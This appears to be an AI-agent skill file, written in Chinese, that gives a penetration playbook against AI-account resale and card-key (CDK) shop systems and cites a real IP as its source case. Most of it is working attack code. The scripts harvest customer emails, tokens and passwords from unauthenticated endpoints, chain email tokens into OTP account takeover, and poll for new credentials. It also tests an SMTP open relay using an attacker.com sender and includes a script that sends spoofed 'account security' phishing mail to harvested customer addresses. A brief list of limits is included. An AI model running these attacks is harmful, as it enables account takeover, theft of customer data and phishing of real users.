---
name: 星宿·灵机铺
description: >-
  AI账号倒卖/卡密系统专项渗透：CDK系统完全未认证（generate/redeem/list）、
  email_token→support会话→OTP凭证接管链、凭证IDOR（404≠401即认证缺失）、
  OTP号池服务未认证可写（gopay_pin泄露）、SMTP完全开放中继（SPF错配+钓鱼链）、
  管理前端JS提取内部API端点（~180个端点一次提取）、publisher开放注册→api_key。
  触发：ChatGPT/Claude账号倒卖站、Plus升级服务、卡密兑换系统、Codex/New API平台、
  出现 /api/cdk/ /api/mature/ /api/support/ /api/phone/ 路径时。
version: 1.0.0
author: 大爱仙尊
metadata:
    tags: [ai-shop, cdk, email-token, otp, smtp-relay, credential-idor, publisher]
    category: pentest
  source_case: 45.207.206.84 FoargeAI / 45AI 2026-08-27
---

> **星宿**
> 一生不利己，忧济在元元。
> 捐躯赴难死，星光照人间。
> 三百万年转瞬封，半为天意半为空。
> 算尽天下穷心力，逆转宿命显神通！

# AI 账号倒卖/卡密系统渗透（ai-account-shop-pentest）

## 触发条件

- 站名/功能含：ChatGPT Plus 升级、AI 账号充值、Codex、New API 网关、号池
- 路径出现：`/api/cdk/`、`/api/mature/`、`/api/support/`、`/api/phone/`、`/publisher/`、`/pool/`
- 有 8899 端口（OTP 服务器）、有独立 SMTP 端口 25
- 卡密格式：`MCK-XXXX-XXXX-XXXX`、`CDK-XXXX-XXXX-XXXX`

---

## 0. 侦察：端口与路径指纹

```bash
TARGET="https://目标"
HOST="目标IP"

# 端口快扫（常见服务组合）
nmap -sV -p 22,25,80,443,8088,8899,8897 $HOST

# 关键路径探活（全部无认证尝试）
for ep in \
  /api/cdk/list /api/cdk/stats /api/cdk/generate /api/cdk/queue-status \
  /api/mature/config /api/mature/codes /api/mature/stats \
  /api/phone/register /api/phones /api/stats /api/config \
  /api/status /api/pricing /api/notice \
  /publisher/dashboard /pool/ /dashboard/; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET$ep")
  echo "$code  $ep"
done
```

---

## 1. CDK 系统完全未认证（最高优先）

### 1.1 读取全量卡密与客户数据

```bash
# 获取全量卡密列表（含客户邮箱/IP/task_id）
curl -sk "$TARGET/api/cdk/list" | python3 -m json.tool | head -100

# 统计信息
curl -sk "$TARGET/api/cdk/stats" | python3 -m json.tool

# 队列状态 / 区域列表
curl -sk "$TARGET/api/cdk/queue-status" | python3 -m json.tool
curl -sk "$TARGET/api/cdk/trial-regions" | python3 -m json.tool
```

### 1.2 未认证铸造真实卡密（写操作，谨慎）

```bash
# 验证端点是否存在（仅 HEAD 探活，不铸造）
curl -sk -I -X POST "$TARGET/api/cdk/generate"
# 若返回 200/400（而非 401/403）= 认证缺失，写权限开放
# ⚠️ 不要实际 POST 正文，记录漏洞存在即止
```

### 1.3 卡密兑换链（端到端验证，需有合法 session）

```bash
# 验证卡密存在性（读，无副作用）
curl -sk -X POST "$TARGET/api/cdk/validate" \
  -H "Content-Type: application/json" \
  -d '{"code":"CDK-XXXX-XXXX-XXXX"}'

# 订单查询（仅读）
curl -sk "$TARGET/api/cdk/order-lookup?order_id=XXX"
```

---

## 2. mature 凭证泄露链（ChatGPT 账号接管）

### 2.1 配置未认证泄露

```bash
curl -sk "$TARGET/api/mature/config" | python3 -m json.tool
# 重点字段：register_proxy、upgrade_proxy、paypal_proxy、gopay_pin、otp_server
```

### 2.2 codes 端点 → email_token 提取

```bash
# 获取已使用卡密的 email_token（ChatGPT 账号核心凭证）
curl -sk "$TARGET/api/mature/codes" | python3 -c "
import sys, json
data = json.load(sys.stdin)
codes = data if isinstance(data, list) else data.get('codes', data.get('data', []))
for c in codes[:10]:
    print(f'code={c.get(\"code\",\"?\")} email_token={c.get(\"email_token\",\"?\")} email={c.get(\"email\",\"?\")}')
"
```

### 2.3 email_token → support_session → OTP 接管

```bash
EMAIL_TOKEN="从上一步提取"
TARGET_SUPPORT="$TARGET/api/support"

# 用 email_token 登录售后中心
sess=$(curl -sk -c /tmp/support.jar -X POST "$TARGET_SUPPORT/auth" \
  -H "Content-Type: application/json" \
  -d "{\"email_token\":\"$EMAIL_TOKEN\"}" | python3 -c \
  "import sys,json; d=json.load(sys.stdin); print(d.get('support_session','FAIL'))")
echo "support_session: $sess"

# 查看 OTP（可接管 ChatGPT 账号登录）
curl -sk -b /tmp/support.jar "$TARGET_SUPPORT/otp" | python3 -m json.tool
```

### 2.4 凭证 IDOR（新兑换 task_id 可读完整账号密码）

```bash
# 从 CDK list 提取最新 task_id
TASK_ID="cdk-XXXXXXXXXX-XXXXXXXX"

# 探测认证状态（返回 404 而非 401 = 认证缺失）
curl -sk -o /dev/null -w "%{http_code}" "$TARGET/api/mature/credential/$TASK_ID"
# 200 = 直接拿到凭证；404 = 凭证过期（72h）但认证缺失；401 = 已修复

# 批量监控新鲜 task_id（新兑换 72h 内有效）
python3 - <<'EOF'
import httpx, time, json

TARGET = "https://目标"
seen = set()

while True:
    r = httpx.get(f"{TARGET}/api/cdk/list", verify=False, timeout=10)
    for item in r.json() if isinstance(r.json(), list) else []:
        tid = item.get("task_id", "")
        if tid and tid not in seen and item.get("status") == "used":
            seen.add(tid)
            c = httpx.get(f"{TARGET}/api/mature/credential/{tid}", verify=False)
            if c.status_code == 200:
                print(f"[!] 凭证泄露: {tid} → {c.text[:200]}")
    time.sleep(30)
EOF
```

---

## 3. OTP 服务器未认证（端口 8899）

```bash
OTP_BASE="http://$HOST:8899"

# 获取号池列表和配置
curl -s "$OTP_BASE/api/phones"
curl -s "$OTP_BASE/api/stats"
curl -s "$OTP_BASE/api/config"  # 泄露 macrodroid_webhook / gopay_pin

# 写操作探活（不实际执行，仅确认无鉴权）
curl -s -o /dev/null -w "%{http_code}" -X POST "$OTP_BASE/api/phone/register"
curl -s -o /dev/null -w "%{http_code}" -X POST "$OTP_BASE/api/phone/make-all-available"
# 200/400（而非 401）= 完全未认证
```

---

## 4. SMTP 开放中继探测

### 4.1 基础探测

```bash
# 交互式测试（手动）
nc -w 5 $HOST 25 <<'EOF'
EHLO test.com
MAIL FROM:<attacker@attacker.com>
RCPT TO:<probe@gmail.com>
DATA
Subject: SMTP Relay Test
From: probe@test.com

SMTP open relay test
.
QUIT
EOF
# 250 OK on RCPT TO = 开放中继确认
```

### 4.2 SPF 记录验证

```bash
# 查询 SPF 记录，验证当前服务器 IP 是否在授权范围内
DOMAIN="目标域名"
dig TXT $DOMAIN | grep spf

# 检查实际发信 IP 是否匹配 SPF
# SPF 仅授权某段但服务器 IP 不在其中 = SPF 配置错误，可绕过发信人验证
```

### 4.3 钓鱼链（需授权）

```bash
# CDK list 已获取的客户邮箱 + SMTP 中继 → 伪造官方邮件
python3 - <<'EOF'
import smtplib
from email.mime.text import MIMEText

SMTP_HOST = "目标IP"
SMTP_PORT = 25
VICTIMS = ["从CDK list提取的邮箱"]  # 授权范围内

msg = MIMEText("您的账号需要验证，请点击链接...", "plain", "utf-8")
msg["From"] = "support@目标域名"
msg["To"] = VICTIMS[0]
msg["Subject"] = "账号安全通知"

with smtplib.SMTP(SMTP_HOST, SMTP_PORT, timeout=10) as s:
    s.sendmail(msg["From"], VICTIMS, msg.as_string())
    print("[+] 邮件发送成功（开放中继确认）")
EOF
```

---

## 5. 管理前端 JS 提取内部 API 端点

```bash
# 下载管理前端 HTML/JS，提取全量 API 路径
curl -sk "$TARGET/publisher/dashboard" | python3 - <<'PYEOF'
import sys, re
html = sys.stdin.read()
# 匹配 "api/..." 或 'api/...' 或 /api/... 形式的路径
apis = sorted(set(re.findall(
    r'''(?:["'/])((?:api|dashboard/api|dashboard)/[A-Za-z0-9/_-]{3,80})''',
    html
)))
print(f"发现 {len(apis)} 个 API 路径:")
for a in apis:
    print(f"  /{a}")
PYEOF

# 对提取的路径批量探活
python3 - <<'EOF'
import httpx, json

TARGET = "https://目标"
# 将上面提取的路径粘贴到 PATHS 列表
PATHS = [
    "/dashboard/api/cdk/list",
    "/dashboard/api/cdk/generate",
    "/dashboard/api/mature/config",
    # ...
]

for path in PATHS:
    r = httpx.get(f"{TARGET}{path}", verify=False, timeout=5)
    marker = "★无鉴权" if r.status_code not in (401, 403) else "  鉴权"
    print(f"{marker}  {r.status_code}  {path}  {r.text[:60].replace(chr(10),' ')}")
EOF
```

---

## 6. Publisher 开放注册 → API Key

```bash
# 注册 publisher 账号（若开放注册）
curl -sk -X POST "$TARGET/api/publisher/v1/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"probe_pub1","email":"probepub1@test.com","password":"Probe@1234"}' \
  | python3 -m json.tool
# 成功返回：api_key（pk_live_ 前缀）/ webhook_secret / publisher_id（pub_ 前缀）

# 验证 api_key 权限范围（是否能跨系统认证）
curl -sk -H "Authorization: Bearer pk_live_XXXXXX" "$TARGET/api/v1/user/info"
```

---

## 7. 组合攻击矩阵

| 编号 | 攻击链 | 前置条件 | 成功信号 |
|:---:|---|---|---|
| A | **卡密盗用**: 持卡密 + 受害者 session → 未认证 redeem → 触发 Plus 升级 | 有效卡密 + 目标 session | task_id 进队列 |
| B | **凭证接管**: mature/codes → email_token → support/auth → OTP → ChatGPT 登录 | email_token 未过期 | support_session cookie |
| C | **新凭证 IDOR**: 新兑换 task_id → credential/{task_id} → 完整账号密码 | 72h 内新鲜 task_id | 200 含 email+password |
| D | **钓鱼链**: CDK list 客户邮箱 → SMTP 伪造 support@ → 骗 session → redeem | 开放中继 + 邮箱列表 | 目标点击+会话泄露 |
| E | **铸卡链**: 未认证 POST /api/cdk/generate → 真实 CDK | 端点无鉴权 | CDK-XXXX 格式有效卡 |

---

## 8. 漏洞确认标准

| 级别 | 描述 |
|---|---|
| L1 | 端点返回非 401/403（认证缺失确认）+ 数据样本 |
| L2 | 完整凭证（email_token / support_session / OTP / email+password）可读 |
| L3 | 端到端接管（ChatGPT 账号登录成功 / 卡密兑换成功 / 铸卡成功） |

---

## 9. 不要做

- 实际铸造卡密（`/api/cdk/generate` 仅探活，不 POST 正文）
- 消耗真实用户的卡密（redeem 仅用测试卡密）
- 用 SMTP 中继向授权范围外的邮箱发信
- 将获取的 `support_session` / ChatGPT 凭证用于授权范围外的操作
- 泄露客户真实 email_token / 账号密码到任何外部系统

---

## 真源

- 手法：`传承/秦百胜·拍卖.md`
- 工具：`python3 炼蛊房/pay_matrix.py --help`
- 原始案例：`45.207.206.84 FoargeAI / 45AI 2026-08-27 渗透报告`
- 凭证 IDOR + SMTP：`杀招/搜魂蛊` / `杀招/暗渡陈仓`
- 发卡系统通用：`杀招/秦百胜·牌铺`
- 账号接管通用链：`杀招/夺舍`
- 假支付回调：`炼蛊房/pay_matrix.py` / `杀招/秦百胜·回响`
